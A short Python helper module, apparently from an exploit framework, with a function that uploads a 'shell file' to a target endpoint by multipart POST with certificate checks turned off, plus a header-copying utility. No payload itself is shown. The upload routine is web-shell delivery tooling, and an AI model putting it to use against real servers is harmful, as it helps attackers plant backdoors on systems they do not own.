# -*- coding: utf-8 -*-
"""HTTP helpers — avoid mutating shared headers across exploit modules."""

from __future__ import (absolute_import, division, print_function)

import copy
import os

import requests

from common.paths import open_shell, shell_path


def fresh_headers(base):
    h = copy.deepcopy(base or {})
    for key in list(h.keys()):
        if key.lower() == "content-type":
            del h[key]
    return h


def post_multipart(url, endpoint, field, shell_file, base_headers, timeout=12):
    headers = fresh_headers(base_headers)
    path = shell_path(shell_file)
    with open(path, "rb") as fh:
        files = {field: (os.path.basename(path), fh)}
        return requests.post(
            endpoint,
            files=files,
            headers=headers,
            verify=False,
            timeout=timeout,
        )
